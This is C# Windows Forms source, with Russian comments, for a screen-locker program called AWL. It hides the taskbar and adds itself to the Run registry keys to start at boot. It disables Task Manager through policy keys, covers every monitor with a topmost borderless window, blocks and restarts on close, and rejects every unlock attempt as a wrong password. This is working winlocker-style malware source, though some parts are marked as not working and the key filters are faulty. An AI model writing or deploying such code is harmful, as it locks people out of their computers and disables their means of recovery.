using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;

namespace AWL
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			KeyDown  += Form1_KeyDown;     //не работает по непонятным пока причинам
			KeyPress += Form1_KeyPress;
			//FormClosing += Form1_FormClosing; //не работает по непонятным пока причинам
			//FormClosed  += Form1_FormClosed;
			Taskbar.Hide();
			AutoStartSetup();                 //не работает по непонятным пока причинам
			KillCtrlAltDelete();
			InitializeComponent();
			GoFullscreen(); 
		}

		private void Form1_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (e.KeyChar == (char)Keys.F4 && e.KeyChar == (int)Keys.Alt)
				e.Handled = true;

			if (e.KeyChar == (char)Keys.Tab && e.KeyChar == (int)Keys.Alt)
				e.Handled = true;
		}

		private void Form1_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyValue == (int)Keys.F4 && e.KeyValue == (int)Keys.Alt)
				e.Handled = true;

			if (e.KeyValue == (int)Keys.Tab && e.KeyValue == (int)Keys.Alt)
				e.Handled = true;
		}
		//private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		//{
		//	Application.Restart();
		//}

		//private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		//{
		//	if (_altF4Pressed)
		//	{
		//		if (e.CloseReason == CloseReason.UserClosing)
		//			e.Cancel = true;
		//		_altF4Pressed = false;
		//	}
		//}
		void AutoStartSetup()
		{
			RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			key.SetValue("AWL.exe", Application.StartupPath.ToString());

			RegistryKey key1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			key1.SetValue("AWL.exe", Application.StartupPath.ToString());

			RegistryKey key2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			key2.SetValue("AWL.exe", Application.ExecutablePath.ToString());

			RegistryKey key3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			key3.SetValue("AWL.exe", Application.ExecutablePath.ToString());
		}
		void GoFullscreen()
		{
			WindowState     = FormWindowState.Maximized;
			FormBorderStyle = FormBorderStyle.None; //убираем рамку окна
			TopMost         = true; // всегда сверху

			Rectangle r = new Rectangle(); // создаем объект чтобы засрать пустым окном все мониторы
			foreach (var scr in Screen.AllScreens) // вычисляем размер окна по количеству экранов. будет работать только если моники расположены по порядку. иначе засрет не полностью
			{
				r.Width += scr.Bounds.Width;
				r.Height = scr.Bounds.Height;
			}
			Bounds = r; // присваиваем окну вычисленный размер прямоугольника
		}
		void KillCtrlAltDelete()
		{
			RegistryKey regkey;
			string keyValueInt = "1";
			string subKey      = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
			regkey             = Registry.CurrentUser.CreateSubKey(subKey);

			regkey.SetValue("DisableTaskMgr", keyValueInt);
			regkey.Close();

		}
		void Form1_Closing(Object sender, CancelEventArgs e)
		{
			e.Cancel = true;
		}
		void Button1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Неправильный пароль для разблокировки.");
		}
		void Form1_Load(object sender, EventArgs e)
		{

		}
		void textBox1_TextChanged(object sender, EventArgs e)
		{

		}
		void label1_Click(object sender, EventArgs e)
		{

		}
		void label2_Click(object sender, EventArgs e)
		{

		}
		void label1_Click_1(object sender, EventArgs e)
		{

		}
		void label2_Click_1(object sender, EventArgs e)
		{

		}
		void label3_Click(object sender, EventArgs e)
		{

		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			Application.Restart();
		}

		private void textBox1_TextChanged_1(object sender, EventArgs e)
		{

		}

		private void label4_Click(object sender, EventArgs e)
		{

		}
	}
}